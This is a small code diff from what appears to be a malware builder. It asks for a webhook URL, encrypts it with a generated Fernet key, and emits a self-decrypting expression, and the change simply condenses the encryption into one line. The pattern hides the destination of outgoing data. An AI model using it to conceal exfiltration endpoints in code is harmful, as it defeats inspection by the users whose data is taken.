@@ -21,8 +21,7 @@ __________
     webhook = str(input(Fore.CYAN + "Webhook URL: " + Style.RESET_ALL))
     
     key = Fernet.generate_key()
-    f = Fernet(key)
-    token = f.encrypt(bytes(webhook, "utf-8"))
+    token = Fernet(key).encrypt(bytes(webhook, "utf-8"))
 
     webhook_enc = f"Fernet({key}).decrypt({token}).decode()"
     
